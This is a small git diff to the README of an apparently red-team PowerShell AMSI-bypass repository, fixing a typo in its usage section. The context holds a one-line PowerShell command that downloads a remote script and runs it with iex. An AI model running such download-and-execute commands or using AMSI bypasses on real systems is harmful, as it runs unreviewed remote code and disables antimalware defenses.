@@ -48,7 +48,7 @@ This causes the current PowerShell process to behave as though AMSI initializati
 ## **How To Use**
 
 ### **Method - 1**
-**Firt Check AMSI status by running Status-Check script "Copy Pase the command into Terminal/Powershell"**
+**First Check AMSI status by running Status-Check script "Copy Pase the command into Terminal/Powershell"**
 ```bash
 iex ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/AnandJogawade/RedTeam-PowerShell-AMSI-Bypass/refs/heads/main/AMSI-Bypass-Scripts/Status-Check.ps1"))
 ```
